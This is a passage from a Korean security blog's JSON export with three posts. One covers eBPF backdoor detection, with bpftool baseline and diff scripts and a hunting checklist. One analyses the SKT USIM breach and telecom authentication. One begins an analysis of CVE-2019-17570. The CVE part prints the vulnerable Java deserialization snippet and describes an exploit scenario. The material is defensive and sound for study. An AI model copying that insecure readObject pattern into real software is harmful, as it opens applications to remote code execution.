\u0026#34;flannel\u0026#34; \u0026#34;calico\u0026#34; \u0026#34;ovs-vswitchd\u0026#34; \u0026#34;normal VM agent\u0026#34;) # Filter out common entries grep -v -E \u0026#34;$(IFS=\u0026#39;|\u0026#39;; echo \u0026#34;${COMMON_PATTERNS[*]}\u0026#34;)\u0026#34; /tmp/bpf_prog_list_all.txt \u0026gt; /tmp/bpf_prog_suspicious.txt echo \u0026#34;[*] Suspicious BPF programs after filtering:\u0026#34; cat /tmp/bpf_prog_suspicious.txt 설명 COMMON_PATTERNS: OpenStack 환경에서 VM들이 공통으로 사용하는 정상적인 BPF 프로그램 이름을 배열로 설정합니다. grep -v -E: 정상 패턴에 일치하지 않는 항목만 남깁니다. 결과 파일: /tmp/bpf_prog_suspicious.txt에 비정상적으로 보이는 항목만 남겨 분석합니다. 요약: 공통 정상 패턴을 제거하고 튀는 것만 보는 방식으로 필터링하면, OpenStack 호스트 수준에서도 eBPF 백도어를 훨씬 빠르게 식별할 수 있습니다.\n자동 학습 기반 공통 패턴 갱신 (diff 방식) 시간이 지남에 따라 Guest OS 공통 패턴은 변경될 수 있습니다. 따라서 수동으로 패턴을 관리하는 대신, 과거와 현재의 bpftool 결과를 비교(diff)하여 자동으로 갱신할 수 있습니다.\n자동 학습 스크립트 예시 #!/bin/bash BASELINE_FILE=\u0026#34;/opt/bpf_baseline.txt\u0026#34; CURRENT_FILE=\u0026#34;/tmp/bpf_current.txt\u0026#34; NEW_SUSPICIOUS_FILE=\u0026#34;/tmp/bpf_diff_suspicious.txt\u0026#34; # Collect current BPF programs bpftool prog show \u0026gt; \u0026#34;$CURRENT_FILE\u0026#34; # If no baseline exists, create one if [ ! -f \u0026#34;$BASELINE_FILE\u0026#34; ]; then echo \u0026#34;[*] No baseline found. Creating initial baseline...\u0026#34; cp \u0026#34;$CURRENT_FILE\u0026#34; \u0026#34;$BASELINE_FILE\u0026#34; exit 0 fi # Compare current with baseline echo \u0026#34;[*] Comparing current BPF programs with baseline...\u0026#34; diff --unchanged-line-format= --old-line-format= \u0026#34;$BASELINE_FILE\u0026#34; --new-line-format=\u0026#39;%L\u0026#39; \u0026#34;$CURRENT_FILE\u0026#34; \u0026gt; \u0026#34;$NEW_SUSPICIOUS_FILE\u0026#34; echo \u0026#34;[*] Newly detected suspicious BPF programs:\u0026#34; cat \u0026#34;$NEW_SUSPICIOUS_FILE\u0026#34; 설명 BASELINE_FILE: 정상적인 BPF 프로그램 목록(기준)을 저장합니다. CURRENT_FILE: 현재 스캔한 BPF 프로그램 목록입니다. diff 명령어를 사용해 기준과 현재를 비교하고, 새로운 항목만 추출합니다. 새로운 eBPF 프로그램이 발견되면 바로 탐지할 수 있습니다. 요약: 정기적으로 bpftool 스캔 결과를 저장하고, diff를 통해 변화를 추적하면 자동으로 튀는 프로그램만 선별할 수 있습니다.\nvSphere + VMware NSX 환경에서의 eBPF 백도어 대응 vSphere(ESXi) 환경에서는 게스트 OS 내부 감시는 어렵지만, NSX를 통해 네트워크 단에서 이상 행위를 감지할 수 있습니다.\n가능한 탐지 방향 방법 설명 Distributed Firewall(DFW) 규칙 활용 예상치 못한 outbound 포트, C2 서버 연결 시도를 탐지하거나 차단 NSX IDS/IPS 기능 활성화 BPFDoor 스타일 통신 패턴(비정상 UDP, ICMP 터널링 등)을 탐지 Flow Analytics 활용 VM 간 비정상 통신(East-West Movement) 흐름을 NSX가 분석하고 이상 징후 감지 NSX Threat Intelligence NSX ATP(Advanced Threat Protection) 모듈이 활성화된 경우 Known IOC 매칭 가능 주의사항 NSX는 커널 내부 변조를 직접 탐지하지 못합니다. (네트워크 관점에서 탐지) 게스트 OS 내부 이상 행위에 대한 대응은 여전히 필요합니다. (Tracee, EDR 등 추가 권장) \u0026ldquo;vSphere 환경에서는 NSX를 활용해 비정상 네트워크 패턴을 탐지하고, 게스트 OS 내부에서는 별도의 런타임 보안 도구로 커널 활동을 모니터링하는 이중 구조가 가장 효과적이다.\u0026rdquo;\n공개된 eBPF 백도어 탐지 프레임워크 및 도구 최근 공개된 여러 오픈소스 도구와 프레임워크가 eBPF 악성 활용을 탐지하기 위해 개발되었습니다. 주요 도구와 그 특징은 다음과 같습니다:\n도구/프레임워크 접근 방식 및 주요 기능 비고 Tracee (Aqua Security) eBPF 기반 실시간 모니터링 도구로, 커널 이벤트를 추적하여 악성 행위를 탐지. 특히 eBPF 프로그램이 kprobe/tracepoint 등에 attach되는 순간 발생하는 bpf_attach 이벤트를 포착해 어떤 eBPF 프로그램(ID, 이름, 타입, 사용된 helper 함수 등)이 로드되는지 기록함​scitepress.org​aquasec.com. 오픈소스 (GitHub 제공)​scitepress.org. Aqua Security 연구팀이 개발하여 eBPF 루트킷과 멀웨어 탐지에 활용​scitepress.org. ebpfkit-monitor Datadog 연구원(Fournier)이 개발한 전용 탐지 툴로, eBPF 바이트코드를 정적 분석하거나 실행 시 모니터링하여 악의적인 eBPF 로딩을 탐지함. 원래 eBPF 루트킷인 ebpfkit을 검출하기 위해 설계되었으며, 의심스러운 eBPF 프로그램 로딩을 감시하고 차단 가능​scitepress.org. 오픈소스 (GitHub 제공). eBPF 루트킷 ebpfkit 대응으로 개발​github.com. Falco (CNCF/Sysdig) 호스트 침입 탐지(HIDS) 도구로, eBPF를 통해 시스템 콜 등을 모니터링하여 악성 행위를 탐지. 최근 버전에서는 bpf() 시스템콜 호출을 감시함으로써 권한 상승을 위한 eBPF 악용 시도를 탐지하고 경보를 발생시킬 수 있음​sysdig.com. 오픈소스 CNCF 프로젝트. 주로 컨테이너/클라우드 환경에서 활용되며, 정책을 설정해 eBPF 관련 이벤트를 추적 가능. bpftool (리눅스 기본 도구) 리눅스 커널에 내장된 BPF 디버깅/관리 도구로, 현재 로드된 eBPF 프로그램, 맵, 링크 정보를 나열할 수 있음. 수동 조사 시 bpftool prog, bpftool map, bpftool link, bpftool perf 등의 명령으로 의심스러운 eBPF 프로그램(예: kprobe 유형 백도어)과 연결 지점(어떤 함수에 붙었는지)을 확인 가능​redcanary.com​redcanary.com. 리눅스 4.x 이상에서 제공. 수동 조사나 스크립트로 활용하여 비정상적 BPF 객체(예: 알 수 없는 이름의 kprobe 프로그램 등) 탐지에 유용​redcanary.com​redcanary.com. Volatility eBPF 플러그인 메모리 포렌식 도구 Volatility용 플러그인으로, 메모리 덤프에서 eBPF 프로그램을 추출하고 분석함. 커널 내부의 prog_idr 구조체를 탐색하여 로드된 모든 eBPF 바이트코드와 메타데이터(이름, 길이, 타입, 사용 helper 함수 등)를 수집​scitepress.org​scitepress.org. 이를 바탕으로 악성 가능성이 높은 eBPF 프로그램을 선별하는 **분류기(classifier)**를 제공. 연구용 도구 (2024년 학술 연구에서 공개​scitepress.org​scitepress.org). 실행 중인 시스템에서는 루트킷에 의해 우회될 수 있으나, 하이퍼바이저나 오프라인 메모리 덤프 분석에 활용하여 내부 관찰자를 회피한 탐지가 가능함​scitepress.org. 이들 도구는 각각 장단점과 적용 범위가 다릅니다. 예를 들어 Tracee와 Falco는 실시간 탐지에 강점이 있어, eBPF 백도어가 로드되는 순간 탐지하거나 실행 중 수상한 시스템콜 패턴을 식별합니다​scitepress.org​sysdig.com. 반면 Volatility 플러그인과 같은 포렌식 도구는 사후 분석에 유용하며, 이미 설치되어 은신 중인 루트킷도 하이퍼바이저 수준에서 메모리를 덤프하여 찾아낼 수 있습니다​scitepress.org. 이러한 도구들을 상황에 맞게 조합하면 다층적인 탐지 전략을 구축할 수 있습니다.\n최신 탐지 방법론 (2023~2025)과 연구 동향 최근 공개된 연구 논문, 보안 보고서, 기술 블로그에서는 eBPF 백도어 탐지를 위한 다양한 접근법과 개선 사항을 제시하고 있습니다. 주요한 방법론은 다음과 같습니다:\n실시간 로드 모니터링: 가장 효과적인 탐지는 eBPF 프로그램이 커널에 로드될 때 이루어집니다​redcanary.com. Red Canary에 따르면, eBPF 기반 멀웨어는 로드 시점을 놓치면 탐지가 극도로 어려워지므로 EDR(Endpoint Detection \u0026amp; Response) 솔루션이나 커스텀 모니터링 도구가 bpf 시스템콜 호출, kprobe 등록 등의 이벤트를 실시간 감시해야 합니다​redcanary.com​redcanary.com. Aqua Security는 이와 관련해 Tracee 도구에 bpf_attach 이벤트 모니터링을 추가하여, 악성 eBPF 프로그램이 kprobe/uretprobe 등에 붙는 순간 자동으로 탐지하도록 구현했습니다​scitepress.org​aquasec.com. 실제로 2023년 Aqua 측은 PAM 인증 모듈을 훔쳐보는 Pamspy 멀웨어를 Tracee로 탐지해냈는데, pam_get_authtok 함수를 후킹한 eBPF uretprobe 프로그램(trace_pam_get_a)의 로드 이벤트를 포착함으로써 평문 크리덴셜 탈취 시도를 적발할 수 있었습니다​aquasec.com. 이처럼 커널 내부 이벤트에 대한 훅(hook) 모니터링은 최신 EDR과 오픈소스 도구에서 중요한 추세입니다.\n커널 내부 무결성 검사 및 제한: eBPF 백도어를 원천 차단하거나 탐지하기 위해 커널 자체에 보안장치를 두는 연구도 진행되고 있습니다. 예를 들어 Sysdig의 보고는, 최신 커널 설정에서 CONFIG_BPF_UNPRIV_DEFAULT_OFF를 통해 비권한 사용자에 의한 eBPF 사용을 막고, SYS_bpf 시스템콜을 루트만 사용하도록 제한하는 것을 권고합니다​sysdig.com. 또한 eBPF에 의한 커널 함수 변조를 막기 위해 CONFIG_BPF_KPROBE_OVERRIDE와 같은 옵션을 비활성화하고, 불필요한 kprobe 기능이나 eBPF 기능은 아예 컴파일 제외하는 식으로 공격 표면을 줄이는 전략도 제시됩니다​redcanary.com. 이러한 설정은 탐지라기보다는 예방적 수단이지만, eBPF 악용을 사전에 차단함으로써 탐지 부담을 낮추는 효과가 있습니다.\n하이퍼바이저 기반 감사(Audit): 호스트 OS 내부에서 동작하는 탐지기는 동일한 커널 권한을 가진 루트킷에 의해 우회될 위험이 있습니다​blog.thalium.re. 이를 보완하고자, 2023~2024년 연구들은 하이퍼바이저 레벨에서 게스트의 eBPF 동작을 감사하는 방안을 모색했습니다. 예를 들어 2023년 SIGCOMM 워크숍의 HyperBee 연구는, 하이퍼바이저가 게스트 OS에 로드되는 모든 eBPF 프로그램을 사전에 검사하도록 하여 악성 코드를 차단하는 프레임워크를 제안했습니다​conferences.sigcomm.org. 마찬가지로 2024년 한 연구에서는 경량 하이퍼바이저를 이용해 게스트 메모리를 스냅샷하고, Volatility 플러그인으로 eBPF 프로그램을 추출한 뒤 의심스러운 helper 함수 호출 여부 등을 분류하는 기법을 선보였습니다​scitepress.org​scitepress.org. 이러한 외부 감사 기법들은 은폐된 루트킷도 투명하게 들여다볼 수 있다는 점에서 향후 실용화 가능성이 주목됩니다.\n시스템 후속 검사 및 헌팅: 만약 실시간 탐지에 실패했다면, 보안 담당자에 의한 수동 헌팅과 분석이 필요합니다. 최신 보고서들은 관리자가 의심 상황에서 다음 사항을 점검하라고 조언합니다:\n예상치 못한 kprobe 존재 여부: /sys/kernel/debug/kprobes/list를 확인하여 등록된 kprobe 중 평소 시스템에서는 볼 수 없는 후킹 지점이 있는지 살펴봅니다​redcanary.com. 예를 들어 사용자 공간에 로드한 적 없는 함수에 대한 kprobe가 걸려 있다면 루트킷을 의심해야 합니다.\n로드된 eBPF 프로그램 나열: bpftool prog 명령으로 현재 메모리에 상주하는 eBPF 프로그램 목록을 확인합니다. 일반적인 시스템에도 cgroup_skb 등 몇몇 eBPF 프로그램이 있을 수 있지만, kprobe 유형 프로그램이나 이상한 이름/경로로 로드된 것이 있다면 주의해야 합니다​redcanary.com. 또한 bpftool perf로 eBPF가 연결된 퍼프 이벤트(perf event) 정보를 보면, 어떤 PID가 어떤 커널 함수에 kprobe/uretprobe를 걸었는지 알 수 있어 수상한 후킹을 찾아낼 수 있습니다​redcanary.com.\n네트워크 훅 및 XDP 확인: ip link show로 네트워크 인터페이스에 XDP 프로그램이 붙어있는지 (prog/xdp id ... 형태) 확인하고​redcanary.com, tc filter show로 트래픽 필터에 eBPF가 사용되었는지 검사합니다. 일반적인 시스템에서는 사용되지 않는 XDP나 TC 필터가 활성화되어 있다면 의심해볼 수 있습니다.\nBPF 가상파일시스템(bpffs) 점검: /sys/fs/bpf/ 디렉토리에 pinning된 객체(eBPF 프로그램이나 맵)가 존재하는지 확인합니다​redcanary.com. 공격자는 eBPF 객체를 pin시켜 영구 저장해두기도 하므로, 알 수 없는 핀 객체가 있다면 분석이 필요합니다.\n시스템 로그 모니터링: 커널 로그(dmesg) 등에 BPF 관련 경고나 오류 메시지가 남았는지 확인합니다. 예를 들어 권한 없는 사용자가 BPF를 시도하다 실패한 로그, 또는 bpf_override_return 등의 위험한 helper 함수 사용 경고가 기록되었을 수 있습니다.\n이상의 방법들은 2023~2024년 보안 블로그와 보고서들에서 공통적으로 권장되는 후속 탐지 기법들입니다​redcanary.com​redcanary.com. 핵심은 시스템 상태를 다각도로 검사하여 eBPF 백도어의 흔적을 찾는 것으로, 일반적인 패턴과 벗어나는 BPF 관련 항목은 모두 수집하여 심층 분석해야 합니다.\n실제 사례: eBPF 백도어 탐지와 대응 BPFDoor 백도어 사례는 eBPF 탐지의 중요성을 일깨워준 대표적 사건입니다. BPFDoor는 2010년대 후반부터 발견된 리눅스 백도어로, 리눅스의 클래식 BPF(cBPF) 필터를 이용해 특정 매직 패킷을 감지하면 공격자의 쉘 접속을 열어주는 방식으로 동작했습니다​trendmicro.com​trendmicro.com. 방화벽 규칙을 회피하고 포트 스캐닝으로 드러나지 않는 기법 탓에 “문이 없는 백도어”라고도 불렸습니다. 2022년 이 백도어가 공개된 후, 2023년에는 APT 공격자들이 BPF 필터 복잡도를 높이는 등 백도어를 고도화하여 계속 활용한 정황이 포착되었습니다​trendmicro.com​trendmicro.com.\n보안 업체들은 BPFDoor 탐지를 위해 네트워크 및 호스트 수준의 징후를 모두 활용했습니다. 예를 들어 Trend Micro는 자사 제품에 BPFDoor의 BPF 필터 패턴을 식별하는 시그니처를 추가하여 탐지율을 높였으며​trendmicro.com​trendmicro.com, 침해 조사 시 setsockopt로 BPF 필터를 삽입하는 행위를 로그에서 찾아내거나, 수상한 raw 소켓을 보유한 프로세스를 추적하는 방식으로 BPFDoor를 찾아냈습니다. 또한 최신 변종 분석을 통해 백도어 활성화 트리거 패킷의 매직 넘버나 BPF 명령어 수 등을 파악함으로써, 이후 샘플에서는 필터 명령이 6배 증가하는 등 진화 양상을 확인하고 방어에 반영했습니다​trendmicro.com​trendmicro.com. BPFDoor 사례는 eBPF 기반 백도어도 면밀히 탐지 가능함을 보여주었지만, 동시에 공격자들도 대응책을 우회하도록 기법을 꾸준히 업데이트하고 있음을 시사합니다.\n다른 실례로 앞서 언급한 Pamspy 멀웨어의 탐지 과정이 있습니다. Pamspy는 eBPF uretprobe를 이용해 libpam.so의 인증 함수 결과를 가로챈 신종 멀웨어인데, Aqua Security 연구진이 Tracee 오픈소스 도구로 이 공격을 탐지해 발표했습니다. Tracee의 경고 로그에는 pam_get_authtok 함수를 후킹한 eBPF 프로그램의 이름과 메모리 오프셋 등이 기록되었고, 이를 통해 시스템 내 숨겨진 백도어 프로세스 없이도 eBPF만으로 자격 증명을 유출하는 공격을 식별해낸 사례입니다​aquasec.com. 이처럼 최신 침해 사례에서는 eBPF 탐지 도구의 활용이 점점 중요해지고 있으며, 커뮤니티와 업체들이 관련 정보를 공유하면서 방어 전략을 발전시키고 있습니다.\n대응 전략 및 실용적 권고사항 eBPF 기반 백도어에 대응하기 위해서는 다층적인 탐지와 예방 전략이 요구됩니다. 아래는 실무적으로 적용할 수 있는 권고사항입니다:\n권한 관리 및 하드닝: 서버에서 eBPF가 불필요하다면 아예 커널 컴파일 옵션이나 sysctl 설정으로 비활성화해놓습니다​sysdig.com. 특히 비권한 사용자(CAP_BPF 권한 미보유)가 eBPF를 사용할 수 없도록 하고, CONFIG_BPF_JIT_ALWAYS_ON 등을 통해 eBPF JIT의 악용 가능성을 낮춥니다. 또한 사용하지 않는 kprobe/tracepoint 기능은 꺼두는 것이 좋습니다​redcanary.com.\n실시간 모니터링 도구 활용: 운영 환경에 오픈소스 HIDS/EDR 도구를 배포하여 eBPF 관련 이벤트를 모니터링합니다. 예를 들어 Falco를 사용하면 bpf() 시스템콜이나 perf_event_open 호출을 룰(rule) 기반으로 감시해 이상 행동을 경고할 수 있고​sysdig.com, Tracee를 데몬으로 실행하면 루트킷이 커널에 훅을 거는 순간 상세 정보를 로그로 남길 수 있습니다​scitepress.org. 이러한 도구는 가볍게 컨테이너화하여 배포할 수도 있으므로, 상시 탐지 체계로 활용합니다.\n정기적 무결성 검사: 크론(cron) 등을 활용해 일정 주기마다 bpftool을 실행하고 로드된 eBPF 프로그램 목록을 덤프하도록 스크립트를 구성합니다. 이전 출력과 **비교(diff)**하여 신규로 등장한 프로그램이나 변화가 있는지를 체크하고, 발견 시 보안 담당자에게 알림을 주도록 합니다. 특히 프로덕션 환경에서 평소 로드되지 않는 kprobe, tracepoint 유형의 프로그램 ID가 새로 생겼다면 즉시 분석이 필요합니다​redcanary.com. 이와 함께 /sys/fs/bpf 디렉토리 내용과 /sys/kernel/debug/kprobes/list도 정기 확인하면 은밀하게 상주하는 백도어를 걸러내는 데 도움이 됩니다​redcanary.com​redcanary.com.\n포렌식 대비: 고급 공격에 대비해 메모리 포렌식 절차를 마련해 둡니다. 중요 서버에는 가능하다면 하이퍼바이저 기반 스냅샷이나 원격 메모리 덤프 수단을 준비하고, 사고 발생 시 Volatility 플러그인 등을 활용해 커널 메모리를 분석함으로써 루트킷이 숨긴 흔적까지 탐지할 수 있도록 합니다​scitepress.org. 이러한 포렌식은 최후의 수단이지만, eBPF 백도어처럼 흔적을 남기지 않는 공격에 대한 마지막 안전망이 될 수 있습니다.\n업데이트 및 정보 공유: eBPF 보안은 최신 연구와 사례 공유가 활발히 이루어지는 분야입니다. 관리자들은 보안 업체의 블로그, 컨퍼런스 자료를 지속적으로 팔로업하여 **최신 IOC(Indicators of Compromise)**와 탐지 룰을 업데이트해야 합니다. 예를 들어 BPFDoor의 새로운 변종에 대응한 시그니처나, GitHub에 공개된 새로운 eBPF 루트킷 샘플 등을 빠르게 입수하여 자체적인 탐지 규칙에 반영해야 합니다.\n결론적으로, eBPF 백도어 탐지는 최신 기술 동향을 반영한 다층적 접근이 요구됩니다. 실시간 모니터링과 사후 검증, 예방적 하드닝을 조합하여 대응하고, 커뮤니티의 오픈소스 도구와 정보를 적극 활용하는 것이 중요합니다. eBPF는 향후에도 공격자에게 매력적인 도구인 만큼, 수비 측에서도 eBPF의 힘을 역이용해 커널을 감시하고 위협을 조기에 차단하는 노력이 필요합니다​sysdig.com. 지속적인 연구 개발과 정보 공유를 통해, 보안 전문가들은 새로운 eBPF 기반 공격 기법에도 한 발 앞선 탐지 능력을 갖추어 나가야 할 것입니다​redcanary.com.\n참고 자료: 주요 내용은 2023~2025년에 발표된 공개 자료를 참고하였으며, Aqua Security, Sysdig, Trend Micro, Red Canary 등의 공식 블로그와 학술 연구​scitepress.org​scitepress.org를 기반으로 정리되었습니다. 각주에 표시된 출처를 통해 세부 내용을 확인할 수 있습니다.\n📌 추가 참고: 국가용 보안요구사항에서도 커널 무결성 검증은 강화되어야 합니다 국가용 보안요구사항에서도 커널 무결성 검증은 \u0026lsquo;조건부 필수\u0026rsquo;로 규정되어 있습니다.\n하지만 중요 기반시설, 외부 노출 서버, 중요정보 처리 서버에서는 선택사항이 아니라 반드시 필수 요건으로 강화되어야 합니다.\n커널 무결성 검증 없이는 시스템의 보안성을 스스로 입증할 수 없습니다.\n📄 National security requirements reference (Korean): 국가정보원 국가용 보안요구사항 공식 링크 ※ 현재 기준(서버 공통보안요구사항 v3.0)에서는 운영체제 커널 또는 커널 레벨 모듈에 대해 \u0026lsquo;조건부 필수\u0026rsquo;로 무결성 검증 기능을 요구하고 있습니다.\n관련 자료 구분 이미지 국가용 보안요구사항 체계도 커널 무결성 검증 항목 (서버 공통보안요구사항 발췌) ","permalink":"http://localhost:1313/ko/post/2025-04-29-ebpf-backdoor-detection-framework/","summary":"eBPF를 악용한 백도어 및 루트킷의 부상과 탐지 난제를 분석하고, Tracee, LKRG, bpftool, Hypervisor 기반 감사 등 최신 대응 방법과 연구 동향(2023~2025)을 종합 정리합니다.","title":"eBPF 기반 백도어 탐지 프레임워크와 최신 방법론"},{"content":" 통신 보안 심층 분석 리포트 1. 통신 인프라의 심장: Ki와 가입자 인증 구조 Ki란 무엇인가 **Ki(Key)**는 이동통신 가입자를 식별하고 인증하는 절대 비밀키이다. USIM 카드 내부와 통신사 코어 인증 서버(HLR/HSS/5GC)에 저장되며, 외부로 절대 노출되지 않는다. Ki 기반으로 난수(RAND) 및 응답(SRES)을 교환하여 통신 인증이 이루어진다. 만약 Ki가 유출되면?\n→ 공격자가 \u0026ldquo;가짜 USIM\u0026quot;을 제작해 통신사 인증을 통과할 수 있다.\n→ 통화 가로채기, 위치 추적, 데이터 탈취 등 심각한 피해로 이어진다.\n가입자 인증 흐름 2G (GSM): RAND → SRES 생성 및 전송 → 통신사 검증 3G (UMTS) / 4G (LTE): AKA 프로토콜 사용, RES 응답 비교 5G (SA 구조): SUPI 보호 → SUCI(암호화된 ID)만 네트워크에 전송 참조: 3GPP TS 33.102\n2. 5G NSA vs 5G SA: 구조적 차이와 보안성 비교 NSA 구조 (Non-Standalone) LTE Core(EPC)에 5G 무선망(NR)만 추가. 가입자 인증 및 세션 관리는 LTE 방식 그대로 유지. IMSI 평문 노출 위험 여전히 존재. SA 구조 (Standalone) 5G Core(5GC) 독립 구축. 공개키 기반 보호 강화 → SUPI를 암호화(SUCI)하여 전송. SUCI(SUPI Concealment):\n가입자는 SUPI를 통신사 공개키로 암호화한 SUCI로 전송. 통신사는 SUCI를 복호화하여 인증 절차 수행. 참조: 3GPP TS 33.501\n3. SKT 2025 해킹 사건: 기술 분석 사건 개요 2025년 4월 19일, SK텔레콤 코어망 서버에서 해킹 정황 발견. 약 2,300만 명의 USIM 정보 유출 가능성. 기술적 문제점 NSA 기반 평문 이동 위험. Ki 유출 시 USIM 복제 및 SIM 스와핑 공격 가능. 예상 공격 시나리오 코어 서버 침투 → 가입자 DB 접근 → 복제 USIM 제작 → 개인정보 탈취. 참조:\n연합뉴스 보도 SKT 공식 발표 4. 과거 주요 사례 심층 분석 Gemalto 해킹 사건 2010~2011년, NSA \u0026amp; GCHQ가 SIM 제조사 Gemalto 해킹 시도. 전 세계 SIM 암호화 키(Ki) 탈취 시도. 참조:\nThe Intercept - Great SIM Heist WIRED - Gemalto Hacked APT10 Operation Soft Cell 중국계 해커 그룹 APT10, 글로벌 통신사 코어망 침투. VIP 가입자 통화 기록, 위치 정보 대량 탈취. 참조:\nCybereason Operation Soft Cell 보고서 Circles SS7 감청 NSO Group 계열사 Circles, SS7 취약점을 활용한 감청 시스템 판매. 25개국 정부기관이 구매하여 통신 감청 활용. 참조:\nCitizen Lab - Running in Circles 5. 이동통신 보안 구조의 역사적 한계와 PKI 및 HSM 부재 비판 왜 초기 이동통신은 PKI를 적용하지 않았나? 2G/3G 시대에는 단말기의 CPU 성능, 배터리 용량, 그리고 통신 속도 모두 큰 제약이 있었다.\nRSA, ECC 같은 공개키 기반 암호 연산은 당시 기술 수준으로는 현실적으로 적용이 불가능했다. 공개키 연산을 위한 충분한 계산 자원도, 전력을 감당할 배터리 용량도 부족했다. 현실적 선택:\n→ 대칭키(Ki) 기반의 간단하고 빠른 인증 구조를 채택할 수밖에 없었다.\n그러나 문제점 가입자 식별자(IMSI)가 평문으로 무선망을 통해 전송되면서,\nIMSI Catcher(가짜 기지국) 공격이 가능해졌다. USIM에 저장된 Ki가 탈취될 경우,\nUSIM 복제를 통한 통신 사칭 공격이 이론적으로 가능해졌다. SIM 제조사, 통신사 등 공급망(Supply Chain)에서 발생할 수 있는\n키 유출 리스크가 과소평가되었다. 특히,\n당시에는 장기 키(Ki)를 보호하기 위한 HSM(Hardware Security Module) 같은\n강력한 하드웨어 기반 키 보호 기술의 적용도 이루어지지 않았다.\n서버 측 코어 장비(HLR/HSS 등)에서도\n명확한 물리적 키 분리나 보안 하드웨어 내부 연산 개념이 부족했다. 이로 인해 코어 서버가 침해당할 경우,\n가입자 인증 키(Ki)가 대규모로 유출될 수 있는 구조적 한계가 존재했다. 결국, 초기 이동통신 시스템은\n\u0026ldquo;빠른 상용화\u0026quot;와 \u0026ldquo;저비용 구현\u0026rdquo; 을 우선순위에 두면서\n보안 아키텍처의 심층 강화는 뒷전으로 밀린 결과를 낳았다.\n지금은 왜 PKI와 HSM이 필수인가? 오늘날,\n현대 단말은 공개키 암호화 연산(RSA, ECC)을 실시간으로 처리할 수 있고, 통신 지연도 극복할 수 있을 만큼 네트워크 성능이 발전했다. 따라서 통신 보안 강화를 위해 필수적으로 적용해야 할 것은:\nSUPI 암호화 (SUCI): 가입자 영구 식별자의 무선망 평문 전송 차단. TLS 보안 채널: Core 네트워크 내부와 외부 간 신뢰성을 확보. 네트워크 슬라이싱별 보안정책: 각 서비스별 분리된 보안 도메인 운영. 그리고 서버 측에서는,\n단순한 소프트웨어 기반 키 보호만으로는 부족하며,\nHSM 또는 이에 준하는 Secure Environment를 통해\n장기 키 및 세션 키의 외부 노출 방지 부트 무결성 보호 물리적 공격 탐지 및 대응 을 수행해야 한다.\n즉,\n초기의 이동통신이 보안보다 상용화를 우선시했다면,\n현재는 신뢰성(trust)이 통신 인프라의 절대적 전제조건이 된 것이다.\n6. 개인 사용자 관점 대응 방법 OpenVPN으로 집 공유기 경유 설정 및 주요 사용 서비스에 IP 제한 설정\nOpenVPN 설치 가이드 OTP 앱 사용\nGoogle Authenticator 소개 하드웨어 보안 키 사용\nYubiKey 공식 사이트 통신사 및 정부에 5G SA 로 인프라 업그레이드 요구\nQualcomm - SA vs NSA 7. 결론 완벽한 통신망은 없다.\n그러나 매일 조금씩, 스스로를 지키는 노력이\n거대한 침묵 속의 유일한 방패가 될 것이다.\n추가 심층 비교 분석 SKT 해킹 사건: 약 2,300만 명 영향. Ki 유출 의심. 현재까지 악용 사례 미발생. Gemalto 해킹: 글로벌 SIM 공급망 공격. 대량 키 유출 여부 논란. APT10 Operation Soft Cell: 중국발 APT 그룹의 장기 통신사 침투. Circles 감청 장비: SS7 취약점 악용, 통신망 수준의 은밀한 감청. 주요 인용 및 참고자료 SKT 공식 뉴스룸 The Intercept - Great SIM Heist WIRED - Gemalto Hacked Cybereason Operation Soft Cell Citizen Lab - Running in Circles ","permalink":"http://localhost:1313/ko/post/2025-04-28-telecom-security-breach-analysis/","summary":"2025년 SKT 해킹 사건을 중심으로, 통신 인프라의 핵심 보안 구조와 과거 글로벌 해킹 사례(Gemalto, APT10, Circles)를 심층 분석한 보고서입니다. 가입자 인증 시스템(Ki, SUPI/SUCI)과 5G SA/NSA 차이점까지 다루었습니다.","title":"통신 보안 심층 분석 리포트: SKT 해킹 사건과 글로벌 사례 분석"},{"content":"\n1. 개요 1.1 보고서 작성 목적 Apache XML-RPC에서 발견된 CVE-2019-17570 취약점의 원인과 해결 방안을 분석하고, 실무에서 적용 가능한 안전한 구현 방법을 제공합니다.\n1.2 보고서 작성 배경 기존 보안 가이드나 도구는 “패치 없음”으로만 표시되어 개발자에게 구체적인 해결책을 제공하지 못하는 경우가 많습니다. 본 보고서는 보안 담당자가 실용적인 가이드를 직접 제공하여 개발자와의 협업 효율을 높이고자 합니다.\n1.3 Apache XML-RPC 개요 Java 기반의 XML-RPC를 구현한 라이브러리로, 현재는 공식적으로 유지보수되지 않고 있습니다.\n1.4 CVE-2019-17570 소개 클라이언트가 신뢰할 수 없는 서버 응답을 역직렬화하는 취약점으로, 원격 코드 실행(RCE) 가능성이 있습니다.\n공식 보안 권고: GitHub Advisory 2. 취약점 상세 분석 2.1 개요 및 영향 CWE-502: 신뢰되지 않은 데이터의 역직렬화 악의적인 서버가 전달한 객체를 클라이언트가 역직렬화하여 임의 코드 실행 가능 2.2 발생 원인 Object exception = map.get(\u0026#34;faultCause\u0026#34;); ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream((byte[]) exception)); errorCause = (Throwable) ois.readObject(); // 취약한 코드 2.3 PoC 시나리오 조작된 faultCause 객체를 전달하는 서버 → 클라이언트에서 자동 역직렬화 → 코드 실행\n3. 패치 분석 3.1 주요 개선점 isEnabledForExceptions 플래그를 추가해 조건부 역직렬화 SAXParser에서 외부 DTD 로딩 차단 3.2 패치 전후 코드 비교 패치 후:\nif (((XmlRpcStreamRequestConfig) cfg).isEnabledForExceptions()) { Object exception = map.get(\u0026#34;faultCause\u0026#34;); ... } DTD 차단:\nspf.setFeature(\u0026#34;http://apache.org/xml/features/nonvalidating/load-external-dtd\u0026#34;, false); 3.3 직접 패치 예시 Debian 패치 openEuler 예시 4. 배포판별 관리 및 Maven 주의사항 4.1 배포판별 보안 패치 Debian, Red Hat, Amazon Linux: 각각 보안 패치 적용 후 관리 4.2 Maven의 한계 공식 저장소에 패치된 버전 없음 → 배포판 패키지 또는 포크 버전 사용 권장 4.3 안전한 대안 \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.evolvedbinary.thirdparty.org.apache.xmlrpc\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;xmlrpc-client\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;4.0.0\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; 5. 안전한 구현 예제 XmlRpcClientConfigImpl config = new XmlRpcClientConfigImpl(); config.setServerURL(new URL(\u0026#34;http://trusted-server.com/RPC2\u0026#34;)); config.setEnabledForExceptions(false); // 역직렬화 비활성화 // 외부 DTD 비활성화 SAXParserFactory spf = SAXParserFactory.newInstance(); 